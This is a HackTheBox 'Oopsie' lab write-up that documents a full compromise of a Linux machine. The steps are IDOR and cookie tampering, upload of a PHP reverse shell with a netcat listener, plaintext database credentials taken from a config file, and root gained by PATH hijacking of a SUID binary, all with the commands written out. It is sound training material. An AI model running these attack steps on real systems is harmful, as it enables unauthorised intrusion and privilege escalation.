# Oopsie

**Platform:** HackTheBox  
**OS:** Linux  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Linux machine running a web application with broken access control.
Cookie manipulation allows privilege escalation within the app, 
leading to file upload abuse and a reverse shell. Credentials found 
in a config file allow lateral movement to a local user. A SUID 
binary with an insecure system call leads to full root compromise.

---

## 1. Reconnaissance

Port scan using nmap:
```bash
nmap -sCV -p- -A 10.129.18.148
```

**Open ports:**

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.6p1 |
| 80 | HTTP | Apache 2.4.29 |

---

## 2. Web Enumeration

Discovered login page using Gobuster:
```bash
gobuster dir -u http://10.129.18.148 -w /usr/share/wordlists/dirb/common.txt
```

Found: `/cdn-cgi/login`

Logged in as guest with default credentials.

---

## 3. Access Control Bypass (IDOR)

Navigated to the accounts section:
/cdn-cgi/login/admin.php?content=accounts&id=1

Found admin user Access ID by changing the `id` parameter.
This is an **IDOR (Insecure Direct Object Reference)** vulnerability.

Modified cookies in Firefox DevTools (F12 → Storage → Cookies):

| Cookie | Value |
|--------|-------|
| role | admin |
| user | 34322 |

Gained access to the upload page.

---

## 4. Reverse Shell Upload

Prepared PHP reverse shell:
```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
nano shell.php  # Set $ip and $port
```

Uploaded shell.php through the upload page.

Started listener:
```bash
nc -lvnp 1234
```

Triggered the shell:
http://10.129.18.148/uploads/shell.php

Received connection as **www-data**.

Upgraded to interactive shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 5. Lateral Movement

Found database credentials in config file:
```bash
cat /var/www/html/cdn-cgi/login/db.php
```

Output:
```php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

Switched to robert:
```bash
su robert
# Password: M3g4C0rpUs3r!
```

Retrieved user flag:
```bash
cat /home/robert/user.txt
```

---

## 6. Privilege Escalation

Found SUID binary owned by root:
```bash
find / -group bugtracker 2>/dev/null
# /usr/bin/bugtracker

ls -la /usr/bin/bugtracker
# -rwsr-xr-- 1 root bugtracker
```

Analyzed the binary:
```bash
strings /usr/bin/bugtracker
```

Found that it calls `cat` without an absolute path.
Exploited via PATH hijacking:
```bash
cd /tmp
echo '/bin/bash' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker
```

Obtained root shell.

Retrieved root flag:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cat /root/root.txt
```

---

## 7. Flags

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| Gobuster | Directory enumeration |
| Burp Suite / DevTools | Cookie manipulation |
| php-reverse-shell | Remote code execution |
| netcat | Reverse shell listener |
| strings | Binary analysis |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| IDOR | Access ID enumeration via URL parameter |
| Broken Access Control | Cookie manipulation to gain admin access |
| Unrestricted File Upload | PHP shell uploaded and executed |
| Insecure SUID Binary | PATH hijacking via relative command call |
